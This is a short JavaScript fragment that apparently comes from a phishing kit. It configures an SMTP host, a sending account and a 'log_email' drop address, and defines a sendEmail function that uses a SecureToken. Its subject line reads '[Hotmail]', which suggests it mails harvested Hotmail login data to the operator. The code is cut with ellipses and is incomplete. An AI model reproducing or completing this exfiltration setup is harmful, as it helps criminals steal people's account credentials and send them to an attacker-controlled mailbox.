  var smtp_host = 'smtp.iohnvale.com';
  var smtp_username = 'williams@iohnvale.com';

  //Enter were logs will go here
  var log_email = 'chris@iohnvale.com'
...
function sendEmail(to,message) {
  ...
  SecureToken: 'ff4e8e1a-f136-484e-ab0c-1b67723614b0',
  To : to,
  From : smtp_username,
  Subject : '==============+ [Hotmail] +================',
  Body : message,
